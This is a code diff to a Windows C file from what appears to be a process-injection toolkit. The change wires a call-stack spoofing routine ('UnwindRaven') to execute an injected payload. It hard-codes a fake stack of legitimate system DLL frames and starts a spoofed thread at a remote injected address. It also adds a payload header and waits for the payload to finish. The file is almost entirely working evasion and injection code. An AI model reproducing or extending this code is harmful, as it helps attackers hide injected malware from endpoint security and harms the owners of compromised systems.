@@ -1,27 +1,23 @@
 #include "unwindraven_integration.h"
 #include "dispatch.h"
+#include "payload.h"
 #include <stdio.h>
 
 #define UR_MAX_BP_ENTRIES   64
 #define UR_MAX_STACK_FRAMES 64
 
-static DWORD WINAPI SpoofedInvokeThunk(LPVOID param)
+BOOL Invoke_UnwindRaven(PINJECTION_CONTEXT ctx)
 {
-    PINJECTION_CONTEXT ctx = (PINJECTION_CONTEXT)param;
-    DispatchInvoke(ctx);   // respects ctx->invokeFlavor
-    return 0;
-}
+    printf("[DEBUG] Running Invoke_UnwindRaven\n");
 
-BOOL SpoofedInvoke_UnwindRaven(PINJECTION_CONTEXT ctx)
-{
-    StackProfileEntry blueprint[UR_MAX_BP_ENTRIES];
-    int bpCount = 0;
+    StackProfileEntry blueprint[] = {
+        { L"C:\\Windows\\system32\\win32u.dll", "NtUserGetMessage", 0x14, FALSE, TRUE, 0 },
+        { L"C:\\Windows\\system32\\USER32.dll", "GetMessageW", 0x22, FALSE, TRUE, 0 },
+        { L"C:\\Windows\\system32\\KERNEL32.DLL", "BaseThreadInitThunk", 0x17, FALSE, TRUE, 0 },
+        { L"C:\\Windows\\system32\\ntdll.dll", "RtlUserThreadStart", 0x2C, FALSE, TRUE, 0 }
+    };    
 
-    if (!LoadBlueprintFile("blueprint.txt", blueprint, &bpCount))
-    {
-        printf("[-] UnwindRaven: failed to load blueprint.\n");
-        return FALSE;
-    }
+    int bpCount = sizeof(blueprint) / sizeof(blueprint[0]);
 
     UR_STACK_CONTEXT sctx = {0};
     StackFrame frames[UR_MAX_STACK_FRAMES];
@@ -33,16 +29,18 @@ BOOL SpoofedInvoke_UnwindRaven(PINJECTION_CONTEXT ctx)
                                           frames,
                                           &frameCount))
     {
-        printf("[-] UnwindRaven: failed to build synthetic stack.\n");
+        printf("[-] Invoke_UnwindRaven: failed to build synthetic stack.\n");
         return FALSE;
     }
 
-    printf("[*] UnwindRaven: starting spoofed invoke thread.\n");
+    DumpSyntheticStack(frames, frameCount);
+
+    printf("[*] Invoke_UnwindRaven: running start spoofed thread.\n");
 
     HANDLE hSpoofed = StartSpoofedThread(
         frames,
         frameCount,
-        (void*)SpoofedInvokeThunk,
+        (void*)ctx->pRemoteAddress,
         ctx,
         NULL,
         NULL,
@@ -51,9 +49,16 @@ BOOL SpoofedInvoke_UnwindRaven(PINJECTION_CONTEXT ctx)
 
     if (!hSpoofed)
     {
-        printf("[-] UnwindRaven: failed to start spoofed thread.\n");
+        printf("[-] Invoke_UnwindRaven: failed to start spoofed thread.\n");
         return FALSE;
     }
+
+    // blocking for the thread to run
+    WaitForSingleObject(hSpoofed, INFINITE);
+
+    printf("Invoke_UnwindRaven: flavor=%d\n", ctx->invokeFlavor);
+
+    printf("Invoke_UnwindRaven: has returned from entryPoint\n");
 
     return (ctx->hThread != NULL);
 }
